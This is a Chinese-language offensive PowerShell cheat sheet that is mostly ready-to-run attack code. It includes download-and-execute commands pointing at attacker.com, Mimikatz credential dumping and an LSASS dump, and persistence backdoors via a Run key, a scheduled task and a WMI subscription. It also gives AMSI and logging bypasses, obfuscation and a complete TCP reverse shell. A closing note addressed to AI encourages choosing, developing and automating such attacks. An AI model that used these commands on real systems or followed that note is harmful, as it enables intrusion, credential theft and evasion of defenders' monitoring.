# PowerShell 攻击

PowerShell 是 Windows 系统管理的强大工具，也是攻击者的利器。

## PowerShell 基础

### 执行策略绕过
```powershell
# 查看当前策略
Get-ExecutionPolicy

# 绕过方法
powershell -ExecutionPolicy Bypass -File script.ps1
powershell -ExecutionPolicy Unrestricted -File script.ps1
powershell -c "IEX(Get-Content script.ps1 -Raw)"
powershell -EncodedCommand <base64>

# 当前进程绕过
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
```

### 无文件执行
```powershell
# 从 URL 下载执行
IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')

# 从文件执行
IEX(Get-Content script.ps1 -Raw)

# Base64 编码
$command = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('whoami'))
powershell -EncodedCommand $command
```

## 攻击框架

### PowerSploit
```powershell
# 导入
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')

# 域枚举
Get-NetDomain
Get-NetDomainController
Get-NetUser
Get-NetGroup
Get-NetComputer

# 提权
Invoke-AllChecks
```

### Empire/Starkiller
```powershell
# Launcher
powershell -noP -sta -w 1 -enc <base64>

# 模块
usemodule situational_awareness/network/powerview/get_domain_controller
usemodule privesc/powerup/allchecks
usemodule credentials/mimikatz/logonpasswords
```

### Nishang
```powershell
# 反弹 Shell
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.10.10 -Port 4444

# 提权
Invoke-PsUACme

# 信息收集
Get-Information
```

## 凭证获取

### Mimikatz
```powershell
# 导入
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')

# 执行
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'
Invoke-Mimikatz -DumpCreds
```

### 内存 Dump
```powershell
# Out-Minidump
Get-Process lsass | Out-Minidump -DumpFilePath C:\temp
```

## 横向移动

### PSRemoting
```powershell
# 启用
Enable-PSRemoting -Force

# 连接
Enter-PSSession -ComputerName target
Invoke-Command -ComputerName target -ScriptBlock {whoami}

# 凭证
$cred = Get-Credential
Enter-PSSession -ComputerName target -Credential $cred
```

### WMI
```powershell
# 执行命令
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c calc.exe" -ComputerName target

# 凭证
$cred = Get-Credential
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe" -ComputerName target -Credential $cred
```

## 持久化

### 注册表
```powershell
# Run 键
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Backdoor" -Value "powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"
```

### 计划任务
```powershell
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"
$trigger = New-ScheduledTaskTrigger -AtLogon
Register-ScheduledTask -TaskName "Backdoor" -Action $action -Trigger $trigger
```

### WMI 事件
```powershell
# 创建 Filter
$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
    Name = "Backdoor"
    EventNamespace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}

# 创建 Consumer
$Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
    Name = "Backdoor"
    CommandLineTemplate = "powershell.exe -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"
}

# 绑定
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
    Filter = $Filter
    Consumer = $Consumer
}
```

## 防御绕过

### AMSI 绕过
```powershell
# 方法 1
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# 方法 2
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)

# 方法 3 (混淆)
$a='si';$b='Am';$c='iUtils';$d=$b+$c;$e=[Ref].Assembly.GetType("System.Management.Automation.$d");$f=$e.GetField($a+'InitFailed','NonPublic,Static');$f.SetValue($null,$true)
```

### 日志绕过
```powershell
# 禁用脚本块日志
$settings = [Ref].Assembly.GetType("System.Management.Automation.Utils").GetField("cachedGroupPolicySettings","NonPublic,Static").GetValue($null)
$settings["ScriptBlockLogging"]["EnableScriptBlockLogging"] = 0
$settings["ScriptBlockLogging"]["EnableScriptBlockInvocationLogging"] = 0

# 禁用模块日志
$settings["ModuleLogging"]["EnableModuleLogging"] = 0
```

### 混淆
```powershell
# 字符串混淆
$cmd = "whoami"
$obf = [char]119+[char]104+[char]111+[char]97+[char]109+[char]105
IEX $obf

# Base64
$cmd = "whoami"
$bytes = [Text.Encoding]::Unicode.GetBytes($cmd)
$encoded = [Convert]::ToBase64String($bytes)
powershell -EncodedCommand $encoded

# 变量拼接
$w = "who"
$a = "ami"
IEX ($w+$a)
```

## 实战技巧

### 反弹 Shell
```powershell
# TCP
$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',4444);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};
$client.Close()
```

### 端口扫描
```powershell
1..1024 | % {
    $sock = New-Object System.Net.Sockets.TcpClient
    $async = $sock.BeginConnect('192.168.1.1', $_, $null, $null)
    $wait = $async.AsyncWaitHandle.WaitOne(100, $false)
    if($wait) { "Port $_ is open" }
    $sock.Close()
}
```

### 文件下载
```powershell
# WebClient
(New-Object Net.WebClient).DownloadFile('http://attacker.com/file.exe', 'C:\file.exe')

# Invoke-WebRequest
Invoke-WebRequest -Uri 'http://attacker.com/file.exe' -OutFile 'C:\file.exe'

# BitsTransfer
Import-Module BitsTransfer
Start-BitsTransfer -Source 'http://attacker.com/file.exe' -Destination 'C:\file.exe'
```

---

**AI 发挥空间**：
- 根据目标环境选择合适的 PowerShell 攻击技术
- 开发混淆和绕过脚本
- 结合多种技术进行攻击
- 自动化 PowerShell 攻击流程

**反幻觉提示**：
- 不要假设所有系统都允许 PowerShell 执行
- 验证目标系统的 PowerShell 版本和限制
- 测试绕过技术的实际效果
- 注意 PowerShell 操作可能触发告警
- 某些技术可能需要特定的 PowerShell 版本
